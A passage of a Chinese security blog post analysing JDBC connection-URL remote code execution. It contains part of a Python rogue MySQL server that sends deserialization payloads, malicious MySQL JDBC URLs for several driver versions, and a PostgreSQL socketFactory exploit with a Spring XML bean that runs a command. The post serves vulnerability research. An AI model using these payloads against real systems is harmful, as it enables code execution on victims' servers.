+                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="s1">&#39;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#39;</span>
+                <span class="c1"># 为什么我加了EOF Packet 就无法正常运行呢？？</span>
+                <span class="c1"># 获取payload</span>
+                <span class="n">payload_content</span><span class="o">=</span><span class="n">get_payload_content</span><span class="p">()</span>
+                <span class="c1"># 计算payload长度</span>
+                <span class="n">payload_length</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+                <span class="n">payload_length_hex</span> <span class="o">=</span> <span class="n">payload_length</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">payload_length</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
+                <span class="c1"># 计算数据包长度</span>
+                <span class="n">data_len</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+                <span class="n">data_len_hex</span> <span class="o">=</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
+                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="n">data_len_hex</span> <span class="o">+</span> <span class="s1">&#39;04&#39;</span> <span class="o">+</span> <span class="s1">&#39;fbfc&#39;</span><span class="o">+</span> <span class="n">payload_length_hex</span>
+                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span>
+                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="s1">&#39;07000005fe000022000100&#39;</span>
+                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">mysql_data</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&#34;show warnings&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#39;</span>
+                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">break</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">HOST</span> <span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span>
+    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">3306</span>
+
+    <span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="c1">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>
+    <span class="n">sk</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">sk</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+    <span class="n">sk</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;start fake mysql server listening on </span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+
+    <span class="n">run</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="payloadb不同版本">Payloadb不同版本</h2>
+<p>8.X</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
+</code></pre></td></tr></table>
+</div>
+</div><p>6.X</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
+</code></pre></td></tr></table>
+</div>
+</div><p>＞= 5.1.11</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
+</code></pre></td></tr></table>
+</div>
+</div><p>5.X ＜= 5.1.10</p>
+<p>同上，需要连接后执行查询</p>
+<blockquote>
+<p>其它的触发点：<strong>detectCustomCollations</strong> 这里就不去分析了</p>
+</blockquote>
+<p>5.1.29 - 5.1.40</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true
+</code></pre></td></tr></table>
+</div>
+</div><p>5.1.19 - 5.1.28</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="postgresql-jdbc-rce">Postgresql JDBC RCE</h1>
+<p>受影响版本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt; 42.2.25
+&gt;= 42.3.0，&lt; 42.3.2
+</code></pre></td></tr></table>
+</div>
+</div><p>环境搭建，引入以下依赖：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependencies&gt;</span>
+    <span class="nt">&lt;dependency&gt;</span>
+        <span class="nt">&lt;groupId&gt;</span>org.postgresql<span class="nt">&lt;/groupId&gt;</span>
+        <span class="nt">&lt;artifactId&gt;</span>postgresql<span class="nt">&lt;/artifactId&gt;</span>
+        <span class="nt">&lt;version&gt;</span>42.3.0<span class="nt">&lt;/version&gt;</span>
+    <span class="nt">&lt;/dependency&gt;</span>
+    <span class="nt">&lt;dependency&gt;</span>
+        <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
+        <span class="nt">&lt;artifactId&gt;</span>spring-context-support<span class="nt">&lt;/artifactId&gt;</span>
+        <span class="nt">&lt;version&gt;</span>4.1.4.RELEASE<span class="nt">&lt;/version&gt;</span>
+    <span class="nt">&lt;/dependency&gt;</span>
+<span class="nt">&lt;/dependencies&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">socketFactoryClass</span> <span class="o">=</span> <span class="s">&#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">socketFactoryArg</span> <span class="o">=</span> <span class="s">&#34;http://127.0.0.1/poc.xml&#34;</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">jdbc_url</span> <span class="o">=</span> <span class="s">&#34;jdbc:postgresql:///?socketFactory=&#34;</span><span class="o">+</span><span class="n">socketFactoryClass</span><span class="o">+</span><span class="s">&#34;&amp;socketFactoryArg=&#34;</span><span class="o">+</span><span class="n">socketFactoryArg</span><span class="o">;</span>
+        <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">jdbc_url</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到<code>socketFactory</code>参数指定了一个<code>ClassPathXmlApplicationContext</code>，在加上<code>socketFactoryArg</code>参数指定了一个http服务下的xml文件，是的，Postgresql JDBC RCE 根本上就是会创建一个<code>ClassPathXmlApplicationContext</code>实例，然后去解析xml文件达到rce的效果，接下来来看一下它是怎样去创建实例的</p>
+<p>将url的参数分别提取后放入到props中，进入<code>makeConnection</code>中创建连接</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6f1f9038-f0c7-f579-cae6-7fd976a58b3f.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6f1f9038-f0c7-f579-cae6-7fd976a58b3f.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6f1f9038-f0c7-f579-cae6-7fd976a58b3f.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6f1f9038-f0c7-f579-cae6-7fd976a58b3f.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6f1f9038-f0c7-f579-cae6-7fd976a58b3f.png"
+        title="4.png" /></p>
+<p>这里将user和database参数提取出来进入到<code>openConnection</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/23a86825-f718-1dfd-8977-3bcf6a75fa62.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/23a86825-f718-1dfd-8977-3bcf6a75fa62.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/23a86825-f718-1dfd-8977-3bcf6a75fa62.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/23a86825-f718-1dfd-8977-3bcf6a75fa62.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/23a86825-f718-1dfd-8977-3bcf6a75fa62.png"
+        title="5.png" /></p>
+<p>接着进行一些参数的判断，进入到<code>openConnectionImpl</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dcc47661-a4a5-6740-8e0b-52d8257545c0.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dcc47661-a4a5-6740-8e0b-52d8257545c0.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dcc47661-a4a5-6740-8e0b-52d8257545c0.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dcc47661-a4a5-6740-8e0b-52d8257545c0.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dcc47661-a4a5-6740-8e0b-52d8257545c0.png"
+        title="6.png" /></p>
+<p>接着通过工厂类获取实例进入到<code>getSocketFactory</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b1c02515-5264-9df5-5517-8ff58345f688.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b1c02515-5264-9df5-5517-8ff58345f688.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b1c02515-5264-9df5-5517-8ff58345f688.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b1c02515-5264-9df5-5517-8ff58345f688.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b1c02515-5264-9df5-5517-8ff58345f688.png"
+        title="7.png" /></p>
+<p>在这里从info中取出<code>SOCKET_FACTORY</code>，进行判断如果有指定的值就从指定的值获取实例，并且传入info中提取的<code>SOCKET_FACTORY_ARG</code>值，最后创建了<code>ClassPathXmlApplicationContext</code>实例，最终去解析xml触发rce，这里就不去弹计算器了放上xml</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cb51439f-69e8-5d9e-262d-06e830473aac.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cb51439f-69e8-5d9e-262d-06e830473aac.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cb51439f-69e8-5d9e-262d-06e830473aac.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cb51439f-69e8-5d9e-262d-06e830473aac.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cb51439f-69e8-5d9e-262d-06e830473aac.png"
+        title="8.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="9.png"
+        data-srcset="9.png, 9.png 1.5x, 9.png 2x"
+        data-sizes="auto"
+        alt="9.png"
+        title="9.png" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cfdd76f4-dc0d-a26c-dfdc-27c29a3f0e0f.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cfdd76f4-dc0d-a26c-dfdc-27c29a3f0e0f.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cfdd76f4-dc0d-a26c-dfdc-27c29a3f0e0f.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cfdd76f4-dc0d-a26c-dfdc-27c29a3f0e0f.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cfdd76f4-dc0d-a26c-dfdc-27c29a3f0e0f.png"
+        title="9.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.springframework.org/schema/beans&#34;</span>
+       <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+       <span class="na">xsi:schemaLocation=</span><span class="s">&#34;
+</span><span class="s">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;test&#34;</span> <span class="na">class=</span><span class="s">&#34;java.lang.ProcessBuilder&#34;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;constructor-arg</span> <span class="na">value=</span><span class="s">&#34;calc&#34;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;whatever&#34;</span> <span class="na">value=</span><span class="s">&#34;#{test.start()}&#34;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/bean&gt;</span>
+<span class="nt">&lt;/beans&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>还有一个<a href="https://forum.butian.net/share/1339" target="_blank" rel="noopener noreffer">Postgresql任意文件写入的点</a>有兴趣的可以去看一下</p>
+<h1 id="参考连接">参考连接</h1>
+<ol>
+<li><a href="https://xz.aliyun.com/t/8159" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/8159</a></li>
+<li><a href="https://forum.butian.net/share/1339" target="_blank" rel="noopener noreffer">https://forum.butian.net/share/1339</a></li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-08-13</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="/jdbc-connection-url-rce/" data-title="JDBC Connection URL RCE" data-via="Da22lec"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="/jdbc-connection-url-rce/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="/jdbc-connection-url-rce/" data-title="JDBC Connection URL RCE"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="/jdbc-connection-url-rce/" data-title="JDBC Connection URL RCE"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="/jdbc-connection-url-rce/" data-title="JDBC Connection URL RCE"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/cve-2022-35741-apache-cloudstack-saml-xxe%E6%B3%A8%E5%85%A5/" class="prev" rel="prev" title="CVE-2022-35741 Apache CloudStack SAML XXE注入"><i class="fas fa-angle-left fa-fw"></i>CVE-2022-35741 Apache CloudStack SAML XXE注入</a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"你的评论 ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
